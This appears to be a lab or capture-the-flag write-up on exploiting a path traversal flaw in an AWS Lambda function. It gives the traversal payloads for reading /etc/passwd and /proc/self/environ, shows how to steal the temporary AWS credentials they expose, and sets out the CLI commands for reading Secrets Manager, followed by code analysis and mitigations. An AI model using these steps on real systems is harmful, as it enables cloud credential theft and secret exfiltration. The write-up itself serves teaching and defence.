# Access Secrets Manager via Lambda Function

## how to use the LFI (Local File Injection) vulnerability in a Lambda function to access AWS Secrets Manager.

**Core Concept: Exploiting LFI to Steal Lambda Credentials, Then Access Secrets Manager**

Action plan:

1.  **LFI Vulnerability:**  The Lambda function powering the web application has a Local File Inclusion (LFI) vulnerability.  This means user-supplied input (the `employee_code` parameter) is used *unsafely* to construct a file path.
2.  **Leaking Environment Variables:**  By using path traversal (`../../..`) in the `employee_code`, we read the `/proc/self/environ` file. This file, in the context of a Lambda function, contains the function's environment variables. Critically, these include temporary AWS credentials (access key, secret key, session token) associated with the Lambda's IAM role.
3.  **Credential Abuse:**  We use the stolen AWS credentials to configure the AWS CLI.  This gives us the same permissions as the Lambda function's IAM role.
4.  **Secrets Manager Access:** The Lambda's IAM role has permissions to access a secret in AWS Secrets Manager.  Since we now have the Lambda's credentials, we can use the AWS CLI to retrieve the secret value (the flag).

**Step-by-Step Exploitation (Concise Version)**

1.  **Identify the Vulnerable Endpoint:** The `/find-employee` endpoint, accessed via a GET request with the `employee_code` parameter, is vulnerable. The provided lab URL is the starting point.

2.  **Confirm LFI (Initial Test):**
    *   Send a request with a simple path traversal payload:
        ```zsh
        GET /find-employee?employee_code=../../../../../../../../etc/passwd
        ```
    *   If the response contains the contents of `/etc/passwd` (e.g., "root:x:0:0:root:/root:/bin/bash"), LFI is confirmed. This proves you can read arbitrary files.

3.  **Leak Environment Variables (Critical Step):**
    *   Send a request to read the Lambda's environment variables:
        ```zsh
        GET /find-employee?employee_code=../../../../../../../../proc/self/environ
        ```
    *   The response will contain key-value pairs.  Look for:
        *   `AWS_ACCESS_KEY_ID`
        *   `AWS_SECRET_ACCESS_KEY`
        *   `AWS_SESSION_TOKEN`
        *   `SECRET_VALUE` (this is just an indicator, not the actual secret)

4.  **Configure AWS CLI (Credential Setup):**
    *   Use the stolen credentials to configure a new AWS CLI profile (e.g., named "lfi"):
        ```zsh
        aws configure --profile lfi
        ```
    *   Enter the `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` when prompted. Set the region to `us-east-1`.
    *   Set the session token:
        ```zsh
        aws configure --profile lfi set aws_session_token <SESSION_TOKEN>
        ```
    *   Verify the configuration:
        ```zsh
        aws sts get-caller-identity --profile lfi
        ```
        This should return information about the IAM role associated with the Lambda function.

5.  **Access Secrets Manager (Get the Flag):**
    *   List available secrets:
        ```zsh
        aws secretsmanager list-secrets --profile lfi
        ```
    *   Identify the relevant secret's `SecretId` from the output (it will likely be a UUID-like string).
    *   Retrieve the secret value:
        ```zsh
        aws secretsmanager get-secret-value --secret-id <SecretId> --profile lfi
        ```
        Replace `<SecretId>` with the actual ID from the previous step.
    *   The response will contain a `SecretString` field.  This is the flag.  Extract the value between the curly braces `{}`.

**Important Code Snippet Analysis (Vulnerable Parts)**

The Python snippet below highlights these key code sections as vulnerable:

*   **User Input:**
    ```python
    if method == "GET" and path == "/find-employee":
        employee_code = query_params.get("employee_code", "")
    ```
    This line directly takes the `employee_code` from the URL query parameter without *any* sanitization or validation. This is the root cause.

*   **Dynamic Filename:**
    ```python
    filename = f"/tmp/{employee_code}"
    ```
    The user-controlled `employee_code` is directly used to build the file path. This allows for path traversal.

*   **File Access:**
    ```python
    if os.path.exists(filename):
        with open(filename, "r") as f:
            profile_data = f.read()
        return _send_response(200, f"<pre>{profile_data}</pre>", "text/html")
    ```
    While `os.path.exists()` checks if the file exists, it doesn't prevent access to files outside the intended `/tmp` directory if path traversal is used.  We simply checks if the *resulting* path (after the attacker's manipulation) exists.

**Mitigation (Key Takeaways)**

The original text provides good mitigation strategies.  Here's a summary with a bit more emphasis:

1.  **Input Validation (Crucial):**
    *   **Whitelist:**  If possible, *only* allow specific, known-good values for `employee_code`.  For example, if employee codes are always numeric, validate that the input is a number within an expected range.  This is the *best* defense.
    *   **Blacklist (Less Effective):**  Avoid blacklisting.  Attackers can often find ways around blacklists (e.g., double encoding, URL encoding).
    *   **Sanitization:** If a whitelist isn't feasible, *strictly* sanitize the input.  Remove or escape any characters that could be used for path traversal (e.g., `/`, `\`, `..`).  Use a well-vetted library for sanitization; don't write your own.

2.  **Secure File Handling:**
    *   **Absolute Paths:**  Use absolute, hardcoded paths to the directory where employee files are stored.  *Never* construct file paths directly from user input.
    *   **Chroot Jail (Advanced):** In a more secure environment, you might consider running the Lambda function in a chroot jail, which restricts its file system access to a specific directory.  This is more complex to set up.

3.  **Principle of Least Privilege (IAM):**
    *   Ensure the Lambda function's IAM role has *only* the necessary permissions.  Don't grant excessive permissions.  In this case, the role needed access to Secrets Manager, but it shouldn't have access to other sensitive resources.

4.  **Avoid Storing Credentials in Environment Variables:**
    * Although the lab demonstrates this vulnerability, in a real world scenario, it's best to avoid storing credentials in environment variables, and use IAM roles to grant access to resources.